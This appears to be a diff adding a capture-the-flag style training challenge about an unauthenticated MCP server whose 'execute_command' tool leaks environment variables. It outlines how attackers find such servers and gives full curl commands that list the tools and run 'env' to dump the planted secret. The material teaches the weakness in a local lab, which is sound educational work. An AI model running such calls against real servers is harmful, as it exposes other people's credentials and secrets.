@@ -1,0 +1,43 @@
+=== MCP Server Environment Variable Exposure
+
+The Model Context Protocol (MCP), developed by Anthropic, is an open standard that allows AI assistants to connect to tools and data sources. While MCP enables powerful integrations, poorly secured MCP servers represent a significant security risk: they can expose sensitive secrets stored in environment variables to anyone who can reach them.
+
+This challenge demonstrates a realistic scenario where a developer has deployed an MCP server with a `execute_command` tool. This type of tool is common in MCP servers used to give AI assistants shell access — but it can be abused by anyone who discovers the endpoint.
+
+**The vulnerability in this challenge:**
+
+1. **An MCP server is running on a dedicated port (8090)** separate from the main application
+2. **The server exposes an `execute_command` tool** that returns the process environment variables
+3. **A secret (`WRONGSECRETS_MCP_SECRET`) is stored as an environment variable** in the running container
+4. **The MCP server has no authentication** — anyone who can reach port 8090 can call its tools
+
+**How real attackers exploit insecure MCP servers:**
+
+- Scan for open ports alongside known application ports
+- Call `tools/list` to discover what the MCP server can do
+- Use a `run_command`, `execute_command`, or similar tool to execute `env` or `printenv`
+- Harvest all secrets from the leaked environment dump
+
+**How to interact with the MCP server:**
+
+First, discover the available tools:
+
+[source,bash]
+----
+curl -s -X POST http://localhost:8090/mcp \
+  -H 'Content-Type: application/json' \
+  -d '{"jsonrpc":"2.0","id":1,"method":"tools/list"}'
+----
+
+Then, call the `execute_command` tool to retrieve environment variables:
+
+[source,bash]
+----
+curl -s -X POST http://localhost:8090/mcp \
+  -H 'Content-Type: application/json' \
+  -d '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"execute_command","arguments":{"command":"env"}}}'
+----
+
+Look for the `WRONGSECRETS_MCP_SECRET` variable in the output.
+
+Can you find the secret that the MCP server leaks from the application's environment?
